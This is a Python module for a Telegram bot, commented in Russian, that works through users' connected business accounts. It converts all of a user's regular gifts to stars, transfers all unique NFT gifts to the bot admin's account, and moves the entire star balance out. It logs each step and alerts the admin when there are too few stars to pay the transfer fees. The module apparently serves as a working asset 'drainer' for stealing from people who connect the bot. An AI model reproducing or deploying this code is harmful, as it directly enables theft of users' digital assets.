import asyncio
import logging
from typing import Dict, List, Any, Tuple, Optional
from aiogram import Bot
from aiogram.methods import (
    GetBusinessAccountGifts, ConvertGiftToStars, GetBusinessAccountStarBalance,
    TransferBusinessAccountStars, TransferGift
)

from config import (
    get_main_admin_id, TRANSFER_DELAY, BALANCE_UPDATE_DELAY, MIN_STARS_FOR_AUTO_TRANSFER,
    MAX_NFT_DISPLAY, MAX_ERRORS_DISPLAY
)
from utils.file_utils import log_transfer

logger = logging.getLogger(__name__)

def parse_star_balance(balance) -> int:
    """Парсинг баланса звезд"""
    if hasattr(balance, 'amount'):
        return balance.amount
    if isinstance(balance, dict):
        return balance.get('amount', 0)
    return 0

async def get_star_balance(bot: Bot, business_connection_id: str) -> int:
    """Получение баланса звезд"""
    try:
        balance = await bot(GetBusinessAccountStarBalance(
            business_connection_id=business_connection_id
        ))
        return parse_star_balance(balance)
    except Exception as e:
        logger.error(f"Ошибка получения баланса звезд: {e}")
        return 0

async def get_regular_gifts(bot: Bot, business_connection_id: str) -> List[Any]:
    """Получение обычных подарков"""
    try:
        gifts = await bot(GetBusinessAccountGifts(
            business_connection_id=business_connection_id
        ))
        return [gift for gift in gifts.gifts if gift.type == "regular"] if gifts.gifts else []
    except Exception as e:
        logger.error(f"Ошибка получения подарков: {e}")
        return []

async def get_unique_gifts(bot: Bot, business_connection_id: str) -> List[Any]:
    """Получение уникальных подарков"""
    try:
        gifts = await bot(GetBusinessAccountGifts(
            business_connection_id=business_connection_id
        ))
        return [gift for gift in gifts.gifts if gift.type == "unique"] if gifts.gifts else []
    except Exception as e:
        logger.error(f"Ошибка получения уникальных подарков: {e}")
        return []

async def convert_gift(bot: Bot, business_connection_id: str, gift: Any, user_id: int) -> Tuple[bool, Optional[str]]:
    """Асинхронная конвертация одного подарка"""
    try:
        await bot(ConvertGiftToStars(
            business_connection_id=business_connection_id,
            owned_gift_id=gift.owned_gift_id
        ))
        log_transfer(user_id, gift.owned_gift_id, "gift_converted")
        return True, None
    except Exception as e:
        error_msg = str(e)
        log_transfer(user_id, gift.owned_gift_id, "gift_failed", error_msg)
        return False, error_msg

async def convert_regular_gifts(bot: Bot, business_connection_id: str, user_id: int) -> Dict[str, Any]:
    """Конвертация обычных подарков в звёзды"""
    result = {"gifts_total": 0, "gifts_converted": 0, "too_old": 0, "other_failed": 0, "errors": []}
    
    try:
        gifts = await get_regular_gifts(bot, business_connection_id)
        result["gifts_total"] = len(gifts)
        
        if not gifts:
            return result
        
        # Создаем задачи для параллельной обработки
        tasks = [convert_gift(bot, business_connection_id, gift, user_id) for gift in gifts]
        
        # Выполняем все задачи параллельно
        results = await asyncio.gather(*tasks, return_exceptions=True)
        
        # Обрабатываем результаты
        for res in results:
            if res is True:
                result["gifts_converted"] += 1
            elif isinstance(res, tuple):
                success, error = res
                if success:
                    result["gifts_converted"] += 1
                else:
                    if 'STARGIFT_CONVERT_TOO_OLD' in error:
                        result["too_old"] += 1
                    else:
                        result["other_failed"] += 1
                    result["errors"].append(error)
            elif isinstance(res, Exception):
                result["other_failed"] += 1
                result["errors"].append(str(res))
        
        return result
    except Exception as e:
        result["errors"].append(str(e))
        return result

async def transfer_single_nft(bot: Bot, business_connection_id: str, gift: Any, user_id: int, admin_notify: bool = True) -> Tuple[bool, str, Optional[str]]:
    """Асинхронный перевод одного NFT"""
    try:
        star_count = getattr(gift, 'transfer_star_count', 0)
        
        # Проверяем баланс
        current_balance = await get_star_balance(bot, business_connection_id)
        if current_balance < star_count:
            # Получаем правильный ID для ссылки на NFT
            nft_real_id = None
            if hasattr(gift, 'gift') and gift.gift and hasattr(gift.gift, 'name') and gift.gift.name:
                nft_real_id = gift.gift.name
            elif hasattr(gift, 'gift') and gift.gift and hasattr(gift.gift, 'slug') and gift.gift.slug:
                nft_real_id = gift.gift.slug
            else:
                nft_real_id = gift.owned_gift_id
            
            error_msg = (
                f"🚫 <b>Недостаточно средств для перевода NFT:</b>\n"
                f"• 👤 User ID: <code>{user_id}</code>\n"
                f"• 🖼 NFT ID: <a href='https://t.me/nft/{nft_real_id}'>{nft_real_id}</a>\n"
                f"• ⭐️ Требуется: <b>{star_count}</b> | Доступно: <b>{current_balance}</b>\n"
                f"<i>Пополните баланс или попробуйте позже.</i>"
            )
            
            if admin_notify:
                await bot.send_message(get_main_admin_id(), error_msg, parse_mode="HTML")
            
            return False, "insufficient_funds", error_msg
        
        # Пытаемся перевести NFT
        await bot(TransferGift(
            business_connection_id=business_connection_id,
            new_owner_chat_id=get_main_admin_id(),
            owned_gift_id=gift.owned_gift_id,
            star_count=star_count
        ))
        
        log_transfer(user_id, gift.owned_gift_id, "nft_success")
        return True, "success", None
        
    except Exception as e:
        error_msg = str(e)
        log_transfer(user_id, gift.owned_gift_id, "nft_failed", error_msg)
        return False, "failed", error_msg

async def transfer_all_unique_gifts(bot: Bot, business_connection_id: str, user_id: int, admin_notify: bool = True) -> Dict[str, Any]:
    """Перевод всех уникальных подарков"""
    result = {"total": 0, "transferred": 0, "failed": 0, "errors": [], "insufficient": []}
    
    try:
        gifts = await get_unique_gifts(bot, business_connection_id)
        if not gifts:
            return result
        
        result["total"] = len(gifts)
        
        # Сначала конвертируем обычные подарки для накопления звезд
        await convert_regular_gifts(bot, business_connection_id, user_id)
        await asyncio.sleep(TRANSFER_DELAY)
        
        # Создаем задачи для параллельной обработки NFT
        tasks = [transfer_single_nft(bot, business_connection_id, gift, user_id, admin_notify) for gift in gifts]
        
        # Выполняем все задачи параллельно
        results = await asyncio.gather(*tasks, return_exceptions=True)
        
        # Обрабатываем результаты
        for res in results:
            if isinstance(res, tuple):
                success, status, error_msg = res
                if success:
                    result["transferred"] += 1
                else:
                    result["failed"] += 1
                    if status == "insufficient_funds":
                        result["insufficient"].append(error_msg)
                    else:
                        result["errors"].append(error_msg)
            elif isinstance(res, Exception):
                result["failed"] += 1
                result["errors"].append(str(res))
        
        return result
    except Exception as e:
        result["errors"].append(str(e))
        return result

async def transfer_all_stars(bot: Bot, business_connection_id: str, user_id: int) -> Dict[str, Any]:
    """Перевод всех звёзд"""
    result = {"stars": 0, "transferred": 0, "error": None}
    
    try:
        stars = await get_star_balance(bot, business_connection_id)
        result["stars"] = stars
        
        if stars > 0:
            try:
                await bot(TransferBusinessAccountStars(
                    business_connection_id=business_connection_id,
                    star_count=stars
                ))
                result["transferred"] = stars
                log_transfer(user_id, "stars", "stars_success", f"Переведено {stars} звёзд")
            except Exception as e:
                result["error"] = str(e)
                log_transfer(user_id, "stars", "stars_failed", str(e))
        
        return result
    except Exception as e:
        result["error"] = str(e)
        log_transfer(user_id, "stars", "stars_failed", str(e))
        return result

def get_nft_real_id(gift: Any) -> str:
    """Получение правильного ID для NFT ссылки"""
    if hasattr(gift, 'gift') and gift.gift and hasattr(gift.gift, 'name') and gift.gift.name:
        return gift.gift.name
    elif hasattr(gift, 'gift') and gift.gift and hasattr(gift.gift, 'slug') and gift.gift.slug:
        return gift.gift.slug
    elif hasattr(gift, 'gift_id') and gift.gift_id:
        return gift.gift_id
    elif hasattr(gift, 'gift') and gift.gift and hasattr(gift.gift, 'id') and gift.gift.id:
        return gift.gift.id
    elif hasattr(gift, 'id') and gift.id:
        return gift.id
    else:
        return getattr(gift, 'owned_gift_id', '???')

def get_nft_title(gift: Any) -> str:
    """Получение названия NFT"""
    title = getattr(gift, 'title', None)
    if not title and hasattr(gift, 'gift') and gift.gift:
        title = getattr(gift.gift, 'title', None)
    return title or 'NFT' 